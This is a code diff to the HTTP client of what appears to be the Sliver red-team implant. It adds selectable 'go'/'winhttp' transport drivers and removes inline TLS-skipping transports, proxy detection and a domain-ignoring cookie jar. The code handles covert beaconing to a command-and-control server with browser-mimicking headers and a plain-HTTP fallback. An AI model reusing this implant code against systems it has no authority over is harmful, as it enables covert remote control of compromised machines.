@@ -23,13 +23,11 @@ package httpclient
 import (
 	"bytes"
 	"context"
-	"crypto/tls"
 	"errors"
 	"fmt"
 	"io"
 	"io/ioutil"
 	insecureRand "math/rand"
-	"net"
 	"net/http"
 	"net/url"
 	"strconv"
@@ -44,12 +42,14 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
-	"github.com/bishopfox/sliver/implant/sliver/proxy"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
 const (
+	goHTTPDriver  = "go"
+	winHTTPDriver = "winhttp"
+
 	userAgent         = "{{GenerateUserAgent}}"
 	nonceQueryArgs    = "abcdefghijklmnopqrstuvwxyz_"
 	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
@@ -62,6 +62,7 @@ var (
 
 // HTTPOptions - c2 specific configuration options
 type HTTPOptions struct {
+	Driver      string
 	NetTimeout  time.Duration
 	TlsTimeout  time.Duration
 	PollTimeout time.Duration
@@ -90,7 +91,13 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 	if err != nil || maxErrors < 0 {
 		maxErrors = 10
 	}
+	driverName := strings.TrimSpace(strings.ToLower(c2URI.Query().Get("driver")))
+	if driverName == "" {
+		driverName = goHTTPDriver
+	}
+
 	return &HTTPOptions{
+		Driver:      driverName,
 		NetTimeout:  netTimeout,
 		TlsTimeout:  tlsTimeout,
 		PollTimeout: pollTimeout,
@@ -105,7 +112,7 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 // HTTPStartSession - Attempts to start a session with a given address
 func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
-	client = httpsClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig)
+	client = httpsClient(address, opts)
 	client.pollTimeout = opts.PollTimeout
 	client.PathPrefix = pathPrefix
 	err := client.SessionInit()
@@ -114,7 +121,7 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
 		}
-		client = httpClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig) // Fallback to insecure HTTP
+		client = httpClient(address, opts) // Fallback to insecure HTTP
 		err = client.SessionInit()
 		if err != nil {
 			return nil, err
@@ -558,122 +565,40 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext
 
 // [ HTTP(S) Clients ] ------------------------------------------------------------
 
-func httpClient(address string, netTimeout time.Duration, tlsTimeout time.Duration, proxyConfig string) *SliverHTTPClient {
-	transport := &http.Transport{
-		Dial:                proxy.Direct.Dial,
-		TLSHandshakeTimeout: tlsTimeout,
-		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
+func httpClient(address string, opts *HTTPOptions) *SliverHTTPClient {
+	origin := fmt.Sprintf("http://%s", address)
+	driver, err := GetHTTPDriver(origin, false, opts)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] failed to initialize driver: %v", err)
+		// {{end}}
+		return nil
 	}
 	client := &SliverHTTPClient{
-		Origin: fmt.Sprintf("http://%s", address),
-		driver: &http.Client{
-			Jar:       cookieJar(),
-			Timeout:   netTimeout,
-			Transport: transport,
-		},
+		Origin:    origin,
+		driver:    driver,
 		pollMutex: &sync.Mutex{},
 		Closed:    false,
 	}
-	parseProxyConfig(client, transport, proxyConfig)
 	return client
 }
 
-func httpsClient(address string, netTimeout time.Duration, tlsTimeout time.Duration, proxyConfig string) *SliverHTTPClient {
-	transport := &http.Transport{
-		Dial: (&net.Dialer{
-			Timeout: netTimeout,
-		}).Dial,
-		TLSHandshakeTimeout: tlsTimeout,
-		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
+func httpsClient(address string, opts *HTTPOptions) *SliverHTTPClient {
+	origin := fmt.Sprintf("https://%s", address)
+	driver, err := GetHTTPDriver(origin, true, opts)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] failed to initialize driver: %v", err)
+		// {{end}}
+		return nil
 	}
 	client := &SliverHTTPClient{
-		Origin: fmt.Sprintf("https://%s", address),
-		driver: &http.Client{
-			Jar:       cookieJar(),
-			Timeout:   netTimeout,
-			Transport: transport,
-		},
+		Origin:    origin,
+		driver:    driver,
 		pollMutex: &sync.Mutex{},
 		Closed:    false,
 	}
-	parseProxyConfig(client, transport, proxyConfig)
 	return client
-}
-
-func parseProxyConfig(client *SliverHTTPClient, transport *http.Transport, proxyConfig string) {
-	switch proxyConfig {
-	case "never":
-		break
-	case "":
-		fallthrough
-	case "auto":
-		p := proxy.NewProvider("").GetHTTPSProxy(client.Origin)
-		if p != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Found proxy %#v\n", p)
-			// {{end}}
-			proxyURL := p.URL()
-			if proxyURL.Scheme == "" {
-				proxyURL.Scheme = "https"
-			}
-			// {{if .Config.Debug}}
-			log.Printf("Proxy URL = '%s'\n", proxyURL)
-			// {{end}}
-			transport.Proxy = http.ProxyURL(proxyURL)
-			client.ProxyURL = proxyURL.String()
-		}
-	default:
-		// {{if .Config.Debug}}
-		log.Printf("Force proxy %#v\n", proxyConfig)
-		// {{end}}
-		proxyURL, err := url.Parse(proxyConfig)
-		if err != nil {
-			break
-		}
-		if proxyURL.Scheme == "" {
-			proxyURL.Scheme = "https"
-		}
-		// {{if .Config.Debug}}
-		log.Printf("Proxy URL = '%s'\n", proxyURL)
-		// {{end}}
-		transport.Proxy = http.ProxyURL(proxyURL)
-		client.ProxyURL = proxyURL.String()
-	}
-}
-
-// Jar - CookieJar implementation that ignores domains/origins
-type Jar struct {
-	lk      sync.Mutex
-	cookies []*http.Cookie
-}
-
-func cookieJar() *Jar {
-	return &Jar{
-		lk:      sync.Mutex{},
-		cookies: []*http.Cookie{},
-	}
-}
-
-// NewJar - Get a new instance of a cookie jar
-func NewJar() *Jar {
-	jar := new(Jar)
-	jar.cookies = make([]*http.Cookie, 0)
-	return jar
-}
-
-// SetCookies handles the receipt of the cookies in a reply for the
-// given URL (which is ignored).
-func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
-	jar.lk.Lock()
-	jar.cookies = append(jar.cookies, cookies...)
-	jar.lk.Unlock()
-}
-
-// Cookies returns the cookies to send in a request for the given URL.
-// It is up to the implementation to honor the standard cookie use
-// restrictions such as in RFC 6265 (which we do not).
-func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
-	return jar.cookies
 }
 
 // {{end}} -HTTPc2Enabled
